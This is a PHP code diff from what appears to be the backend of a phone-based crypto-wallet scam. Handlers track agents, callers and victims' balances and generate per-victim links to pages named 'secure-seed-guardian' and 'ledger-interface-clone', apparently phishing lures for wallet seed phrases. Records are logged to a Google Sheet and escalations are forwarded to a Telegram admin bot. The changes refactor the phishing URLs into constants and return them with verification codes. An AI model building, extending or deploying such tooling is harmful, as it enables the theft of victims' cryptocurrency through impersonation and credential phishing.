@@ -19,6 +19,7 @@ $reference = isset($_POST['reference']) ? trim($_POST['reference']) : '';
 $agent     = isset($_POST['agent'])     ? trim($_POST['agent'])     : '';
 $caller    = isset($_POST['caller'])    ? trim($_POST['caller'])    : '';
 $department = isset($_POST['department'])    ? trim($_POST['department'])    : '';
+$message  = isset($_POST['message'])  ? trim($_POST['message'])  : '';
 
 // user info data
 $balance = isset($_POST['balance']) ? trim($_POST['balance']) : '';
@@ -123,7 +124,9 @@ function handleVerifyAction($reference)
     return [
         'success' => true,
         'verification_code' => $verificationCode,
-        'message' => 'Verification code generated'
+        'message' => 'Verification code generated',
+        'seed_url' => SEED_URL . strtolower($reference),
+        'ledger_url' => LEDGER_URL . "?ref=" . strtolower($reference)
 
     ];
 }
@@ -222,7 +225,7 @@ function handleSeedPhraseAction($reference)
 {
     global $agent, $department, $balance;
 
-    $seedUrl = "https://secure-seed-guardian.lovable.app/" . strtolower($reference);
+    $seedUrl = SEED_URL . strtolower($reference);
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -262,7 +265,7 @@ function handleLedgerAction($reference)
 {
     global $agent, $department, $balance;
 
-    $ledgerUrl = "https://ledger-interface-clone.lovable.app?ref=" . strtolower($reference);
+    $ledgerUrl = LEDGER_URL."?ref=" . strtolower($reference);
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -472,7 +475,7 @@ function handleUserInfoAction($reference)
 
 function handleAlertTeamAction($reference)
 {
-    global $agent, $department, $notes;
+    global $agent, $department, $message;
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -489,7 +492,7 @@ function handleAlertTeamAction($reference)
         'Activity' => 'Escalation',
         'Department' => $department ?? 'Unknown',
         'Agent' => $agent . ' (' . $role . ')',
-        'Notes' => $notes
+        'Notes' => $message
     ];
 
     sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
